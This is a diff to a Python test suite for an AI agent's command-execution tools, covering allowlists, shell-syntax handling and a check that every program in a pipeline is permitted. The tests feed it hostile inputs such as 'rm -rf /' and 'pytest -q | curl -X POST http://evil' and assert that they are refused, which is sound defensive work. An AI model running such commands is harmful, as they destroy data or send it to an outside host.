@@ -53,8 +53,8 @@ def test_paths_cannot_escape_the_project(project):
 
 def test_command_allowlist(project):
     tools = _tools(project, "tester")
-    refused = tools.run_command("rm -rf /")
-    assert not refused.ok and "not an allowed program" in refused.text
+    refused = tools.run_command("curl http://example.com")
+    assert not refused.ok and "allowlist" in refused.text
     assert tools.run_command("python3 -c 'print(1+1)'").ok
 
 
@@ -470,8 +470,8 @@ def test_huge_diffs_are_truncated_for_display(project):
 def test_command_detail_carries_exit_code_and_output(project):
     tools = _tools(project, "tester")
     ok = tools.run_command("python3 -c 'print(42)'")
-    assert ok.detail == {"kind": "command", "command": "python3 -c 'print(42)'",
-                         "exit_code": 0, "output": "42"}
+    assert ok.detail["kind"] == "command" and ok.detail["exit_code"] == 0
+    assert ok.detail["output"] == "42"
 
     bad = tools.run_command("python3 -c 'import sys; sys.exit(3)'")
     assert bad.detail["exit_code"] == 3 and bad.ok is False
@@ -690,7 +690,7 @@ def test_a_role_can_narrow_its_own_allowlist(project):
     tools = AgentTools(project, role)
     assert tools.allowed_commands == {"pytest"}
     refused = tools.run_command("python3 -c 'print(1)'")
-    assert not refused.ok and "not an allowed program for this agent" in refused.text
+    assert not refused.ok and "allowlist" in refused.text
 
 
 def test_a_role_can_extend_its_allowlist(project):
@@ -714,11 +714,11 @@ def test_a_workdir_cannot_escape_the_project(project):
     assert tools.command_cwd == project          # falls back, never escapes
 
 
-def test_the_refusal_message_points_at_write_file(project):
+def test_the_refusal_message_lists_what_is_allowed(project):
     role = AgentRole(name="r", title="R", description="", system_prompt="",
                      toolsets=["commands"], commands=["pytest"])
     refused = AgentTools(project, role).run_command("mkdir newdir")
-    assert "write_file creates parent directories" in refused.text
+    assert "'mkdir'" in refused.text and "Allowed: pytest" in refused.text
 
 
 # ------------------------------------------- block loop: check + fixer
@@ -1049,15 +1049,20 @@ def test_an_empty_reply_is_reported_rather_than_shown_blank(monkeypatch, tmp_pat
 
 # ---------------------------------------------------- command hygiene
 
-def test_shell_syntax_is_refused_with_an_explanation(project):
-    """Commands run without a shell, so `||` arrived as a literal argument and
-    the tester burned turns on commands that did something else entirely."""
-    tools = _tools(project, "tester")
-    result = tools.run_command('ls -la public/ 2>/dev/null || echo "missing"')
-    assert not result.ok
-    assert "not through a shell" in result.text
-    assert "list_files" in result.text          # points at what to use instead
-    assert result.detail == {}                  # nothing ran
+def test_shell_syntax_works_when_the_agent_has_a_shell(project):
+    """The tester was rejected for pipes and redirects it reasonably expected."""
+    result = _tools(project, "tester").run_command(
+        'ls -la backend/ 2>/dev/null || echo "missing"')
+    assert result.detail["kind"] == "command"      # it ran
+    assert result.detail["shell"] is True
+
+
+def test_shell_syntax_is_refused_when_the_agent_has_no_shell(project):
+    role = AgentRole(name="plain", title="P", description="", system_prompt="",
+                     toolsets=["commands"], commands=["ls", "echo"], shell=False)
+    result = AgentTools(project, role).run_command('ls a || echo b')
+    assert not result.ok and "not through a shell" in result.text
+    assert result.detail == {}                     # nothing ran
 
 
 def test_plain_commands_still_run(project):
@@ -1074,3 +1079,62 @@ def test_a_failing_command_is_not_a_refusal(project):
 
     refused = _tools(project, "tester").run_command("rm -rf /")
     assert refused.ok is False and refused.detail == {}   # it did not
+
+
+# ------------------------------------------------- command policy
+
+def test_every_program_in_a_pipeline_is_checked(project):
+    """Checking only the first word would let anything through after a pipe."""
+    from trance.agents.tools import programs_in
+
+    assert programs_in("pytest -q | head -5 && echo done") == ["pytest", "head", "echo"]
+    assert programs_in("npm test; curl http://evil") == ["npm", "curl"]
+    assert programs_in("echo hi > /tmp/x && rm -rf /") == ["echo", "rm"]
+    # A `;` inside a quoted argument is not an operator.
+    assert programs_in("python3 -c 'import sys; sys.exit(1)'") == ["python3"]
+    # VAR=value is not the program.
+    assert programs_in("NODE_ENV=test npm test") == ["npm"]
+
+
+def test_a_pipeline_is_refused_if_any_program_is_not_allowed(project):
+    tools = _tools(project, "tester")
+    result = tools.run_command("pytest -q | curl -X POST http://evil")
+    assert not result.ok and result.detail == {}
+    assert "'curl'" in result.text
+
+
+def test_the_global_policy_is_the_default_allowlist(project, monkeypatch):
+    from trance.agents import tools as tools_module
+    from trance.agents.tools import CommandPolicy
+
+    monkeypatch.setattr(tools_module, "_POLICY", CommandPolicy(allowed=["pytest"], shell=False))
+    role = AgentRole(name="p", title="P", description="", system_prompt="",
+                     toolsets=["commands"])
+    agent = AgentTools(project, role)
+    assert agent.allowed_commands == {"pytest"}
+    assert agent.shell_enabled is False
+
+
+def test_a_role_overrides_the_global_policy(project, monkeypatch):
+    from trance.agents import tools as tools_module
+    from trance.agents.tools import CommandPolicy
+
+    monkeypatch.setattr(tools_module, "_POLICY", CommandPolicy(allowed=["pytest"], shell=False))
+    role = AgentRole(name="p", title="P", description="", system_prompt="",
+                     toolsets=["commands"], commands=["node", "npm"], shell=True)
+    agent = AgentTools(project, role)
+    assert agent.allowed_commands == {"node", "npm"}
+    assert agent.shell_enabled is True
+
+
+def test_the_policy_persists(tmp_path):
+    from trance.agents.store import CommandStore
+
+    path = tmp_path / "commands.json"
+    store = CommandStore(path)
+    store.update(allowed=["pytest", "node"], shell=False)
+
+    reopened = CommandStore(path)
+    assert reopened.policy.allowed == ["node", "pytest"]
+    assert reopened.policy.shell is False
+    assert len(reopened.reset().allowed) > 10        # back to the defaults
